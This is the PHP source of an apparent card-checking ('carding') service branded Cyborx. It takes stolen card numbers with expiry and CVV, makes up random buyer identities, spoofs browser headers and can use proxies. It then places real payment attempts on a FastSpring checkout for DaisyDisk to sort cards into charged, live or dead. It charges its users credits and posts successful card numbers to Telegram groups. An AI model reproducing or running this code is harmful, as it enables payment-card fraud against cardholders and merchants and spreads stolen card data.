<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php';
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;

if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}

$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}

$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];

if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
    exit;
}

if ($currentCredits < 2) {
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}

$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';

if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $proxy = "http://$proxyUsername:$proxyPassword@$proxyHost:$proxyPort";
} else {
    $proxy = '';
}

$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
$cc1 = $_GET['cc'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');

if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {
    echo json_encode(['Response' => 'Invalid Card Format']);
    exit;
}

$yearLength = strlen($year);
if ($yearLength <= 2) {
    $year = "20" . $year;
}
$month = sprintf('%02d', (int)$month);

function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}

function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/" . urlencode($binNumber);
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}

function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}

function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}

function get_random_info() {
    $names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
    $states = ['California', 'Texas', 'New York', 'Florida', 'Illinois'];
    $state_abbr = ['CA', 'TX', 'NY', 'FL', 'IL'];
    return [
        'fname' => $names[array_rand($names)],
        'lname' => $names[array_rand($names)],
        'email' => strtolower($names[array_rand($names)]) . '@gmail.com',
        'phone' => '555' . rand(100, 999) . rand(1000, 9999),
        'add1' => rand(100, 999) . ' ' . $cities[array_rand($cities)] . ' St',
        'city' => $cities[array_rand($cities)],
        'state' => $states[array_rand($states)],
        'state_short' => $state_abbr[array_rand($state_abbr)],
        'zip' => rand(10000, 99999)
    ];
}

function gets($string, $start, $end) {
    $startPos = strpos($string, $start);
    if ($startPos === false) return '';
    $startPos += strlen($start);
    $endPos = strpos($string, $end, $startPos);
    return $endPos === false ? '' : substr($string, $startPos, $endPos - $startPos);
}

$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config']);
    exit;
}

$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
$brand = $binInfo['brand'];
$card_type = $binInfo['card_type'];
$level = $binInfo['level'];
$issuer = $binInfo['issuer'];
$country_info = $binInfo['country_info'];
curl_close($chBin);

$cookieFile = tempnam(sys_get_temp_dir(), 'cookie');
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$random_data = get_random_info();
$fname = $random_data['fname'];
$lname = $random_data['lname'];
$email = $random_data['email'];
$phone = $random_data['phone'];
$add1 = $random_data['add1'];
$city = $random_data['city'];
$state = $random_data['state'];
$state_short = $random_data['state_short'];
$zip = strval($random_data['zip']);
$user = $fname . rand(9999, 574545);
$ua = generateUserAgent();

// Step 1: Get client IP
$headers = [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Origin: https://www.antarestech.com',
    'Pragma: no-cache',
    'Referer: https://www.antarestech.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Sec-GPC: 1',
    'User-Agent: ' . $ua,
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
];
curl_setopt($ch, CURLOPT_URL, 'https://cms.antarestech.com/wp-json/antares/v1/get_client_ip');
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
$ip = trim($response);
if (empty($ip)) {
    $ip = '127.0.0.1';
}

// Step 2: Get token from daisydisk
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'if-modified-since: Wed, 08 Oct 2025 17:09:18 GMT',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $ua,
];
curl_setopt($ch, CURLOPT_URL, 'https://daisydisk.onfastspring.com/daisydisk');
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
$xtoken = gets($response, '"token":"', '"');

// Step 3: Send payment request
$headers = [
    'accept: application/json, text/plain, */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json;charset=UTF-8',
    'origin: https://daisydisk.onfastspring.com',
    'priority: u=1, i',
    'referer: https://daisydisk.onfastspring.com/daisydisk',
    'sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: ' . $ua,
    'x-session-token: ' . $xtoken,
];
$json_data = [
    'contact' => [
        'email' => "$user@gmail.com",
        'country' => 'US',
        'firstName' => $fname,
        'lastName' => $lname,
        'postalCode' => $zip,
        'region' => $state_short,
    ],
    'card' => [
        'year' => substr($year, -2),
        'month' => $month,
        'number' => $cc,
        'security' => $cvv,
    ],
    'sepa' => [
        'iban' => '',
        'ipAddress' => $ip,
    ],
    'ach' => [
        'routingNum' => '',
        'accountType' => '',
        'accountNum' => '',
        'confirmAccountNumber' => '',
    ],
    'upi' => [
        'mobileAppSelected' => '',
        'requestMobileExperience' => false,
    ],
    'cpfNumber' => null,
    'paymentType' => 'card',
    'subscribe' => true,
    'recipientSelected' => false,
];
$json_payload = json_encode($json_data, JSON_UNESCAPED_SLASHES | JSON_FORCE_OBJECT);
curl_setopt($ch, CURLOPT_URL, "https://daisydisk.onfastspring.com/session/daisydisk/payment");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);

// Log response for debugging
// $file = "cc_responses.txt";
// $handle = fopen($file, "a");
// fwrite($handle, "cc = $cc1\nresponse = $response\n\n");
// fclose($handle);

$response_data = json_decode($response, true);

// Step 4: Process response
if (stripos($response, '/complete') !== false) {
    $err = 'Payment successful';
    $new_credits = updateCredits($pdo, $uid, 3, false, true);
    $fullResult =
        "<b>#FastspringCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>$cc1</code>\n" .
        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
        "[ﾒ] <b>Response ➜</b> $err 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Fastspring 10$\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> $brand - $card_type - $level\n" .
        "[ﾒ] <b>Bank ➜</b> $issuer\n" .
        "[ﾒ] <b>Country ➜</b> $country_info\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
        "<b>Response ➜</b> $err 🎉\n" .
        "<b>Gateway ➜</b> Fastspring 10$\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'Fastspring 10$',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
} elseif (stripos($response, 'url3ds') !== false) {
    $err = '3DS Required';
    $new_credits = updateCredits($pdo, $uid, 1, true, false);
    $fullResult =
        "<b>#FastspringCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>$cc1</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> $err\n" .
        "[ﾒ] <b>Gateway ➜</b> Fastspring 10$\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> $brand - $card_type - $level\n" .
        "[ﾒ] <b>Bank ➜</b> $issuer\n" .
        "[ﾒ] <b>Country ➜</b> $country_info\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'Fastspring 10$',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
} else {
    $err = 'Unknown Response';
    if (stripos($response, '"type":"danger","phrase"') !== false) {
        $err = gets($response, '"messages":[{"type":"danger","phrase":"', '"');
    } elseif (stripos($response, '"type":"error","field"') !== false) {
        $err = 'Error Reason: ' . gets($response, '"type":"error","field":"', '"');
    }
    $new_credits = updateCredits($pdo, $uid, 0);
    echo json_encode([
        'status' => 'dead',
        'Response' => $err,
        'Gateway' => 'Fastspring 10$',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
}

curl_close($ch);
unlink($cookieFile);
exit;
?>